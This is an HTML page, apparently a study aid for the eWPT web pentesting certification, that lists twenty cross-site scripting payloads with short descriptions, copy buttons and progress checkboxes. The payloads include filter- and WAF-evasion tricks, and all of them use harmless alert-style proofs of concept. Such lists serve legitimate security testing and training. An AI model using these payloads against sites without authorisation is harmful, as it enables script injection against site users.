<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payload Checklist - eWPT</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 20px; }
        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff9d; padding-bottom: 10px; }
        h2 { color: #00ff9d; margin: 0; }
        table { width: 100%; border-collapse: collapse; background-color: #262626; margin-top: 20px; table-layout: fixed; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; word-wrap: break-word; }
        th { background-color: #333; color: #00ff9d; position: sticky; top: 0; }
        tr:hover { background-color: #2d2d2d; }
        .payload-code { font-family: 'Courier New', monospace; color: #ff79c6; background: #1a1a1a; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; }
        button { background-color: #00ff9d; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; min-width: 80px; }
        button:active { background-color: #00cc7e; }
        .reset-btn { background-color: #ff5555; color: white; }
        input[type="text"] { width: 95%; background: #333; border: 1px solid #555; color: #fff; padding: 6px; border-radius: 3px; }
        .checkbox-col { text-align: center; width: 50px; }
        .num-col { width: 30px; }
        .action-col { width: 100px; }
    </style>
</head>
<body>

    <div class="header-container">
        <h2>⚡ XSS Payload Checklist</h2>
        <button class="reset-btn" onclick="resetForm()">Clear All</button>
    </div>
    <p>Live tool for copying XXS Payloads.</p>

    <table id="payloadTable">
        <thead>
            <tr>
                <th class="num-col">#</th>
                <th style="width: 30%;">Payload</th>
                <th style="width: 25%;">Description</th>
                <th class="action-col">Action</th>
                <th class="checkbox-col">Done</th>
                <th>Notes</th>
            </tr>
        </thead>
        <tbody id="tableBody">
            <!-- Populated by JavaScript -->
        </tbody>
    </table>

    <script>
        const payloads = [
            { id: 1, p: '<script>alert(1)<\/script>', d: 'Basic Tag: Standard execution' },
            { id: 2, p: '<img src=x onerror=alert(1)>', d: 'Event Handler: No script tags' },
            { id: 3, p: '<svg/onload=alert(1)>', d: 'SVG: Bypasses simple tag filters' },
            { id: 4, p: 'javascript:alert(1)', d: 'Protocol: For href/src attributes' },
            { id: 5, p: '\'"><script>alert(1)<\/script>', d: 'Breakout: Escapes attributes' },
            { id: 6, p: '<details open ontoggle=alert(1)>', d: 'HTML5: Modern browsers' },
            { id: 7, p: '<scr<script>ipt>alert(1)<\/script>', d: 'Recursion: Bypass strip-once' },
            { id: 8, p: '<img/src="x"/onerror="prompt(1)">', d: 'Space Evasion: Uses / instead of space' },
            { id: 9, p: '<iframe src="javascript:alert(1)">', d: 'Iframe: Frame context' },
            { id: 10, p: '<video><source onerror="alert(1)">', d: 'Media: Event-based fallback' },
            { id: 11, p: '<body onload=alert(1)>', d: 'Body: Fires on DOM ready' },
            { id: 12, p: '<marquee onstart=alert(1)>', d: 'Legacy: Often missed by WAF' },
            { id: 13, p: '<isindex type=image src=1 onerror=alert(1)>', d: 'Obscure: Old tag bypass' },
            { id: 14, p: '&lt;script&gt;alert(1)&lt;/script&gt;', d: 'Entities: Testing decoding' },
            { id: 15, p: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', d: 'Unicode: Bypass < regex' },
            { id: 16, p: '\'-alert(1)-\'', d: 'JS Context: Inside script tags' },
            { id: 17, p: '";alert(1);//', d: 'String Break: Breaking JS variables' },
            { id: 18, p: '<a href="javascript:confirm(1)">Click</a>', d: 'Interaction: High stealth' },
            { id: 19, p: '<input onfocus=alert(1) autofocus>', d: 'Autofocus: No interaction needed' },
            { id: 20, p: '<math><mtext><option><fake><script>alert(1)<\/script>', d: 'Namespace: Complex nesting' }
        ];

        const tableBody = document.getElementById('tableBody');

        payloads.forEach(item => {
            // Encode to Base64 to safely pass through the onclick attribute
            const b64 = btoa(item.p);
            
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${item.id}</td>
                <td><span class="payload-code">${escapeHTML(item.p)}</span></td>
                <td>${item.d}</td>
                <td><button onclick="copyEncoded('${b64}')">Copy</button></td>
                <td class="checkbox-col"><input type="checkbox" class="task-check"></td>
                <td><input type="text" class="task-note" placeholder="Observations..."></td>
            `;
            tableBody.appendChild(row);
        });

        function escapeHTML(str) {
            return str.replace(/[&<>"']/g, function(m) {
                return {
                    '&': '&amp;',
                    '<': '&lt;',
                    '>': '&gt;',
                    '"': '&quot;',
                    "'": '&#39;'
                }[m];
            });
        }

        function copyEncoded(b64Data) {
            const original = atob(b64Data);
            const btn = event.target;
            
            navigator.clipboard.writeText(original).then(() => {
                const oldText = btn.innerText;
                btn.innerText = 'Copied!';
                btn.style.backgroundColor = '#ffffff';
                setTimeout(() => { 
                    btn.innerText = oldText; 
                    btn.style.backgroundColor = '#00ff9d';
                }, 800);
            });
        }

        function resetForm() {
            if(confirm("Clear all progress?")) {
                document.querySelectorAll('.task-check').forEach(cb => cb.checked = false);
                document.querySelectorAll('.task-note').forEach(nt => nt.value = '');
            }
        }
    </script>
</body>
</html>
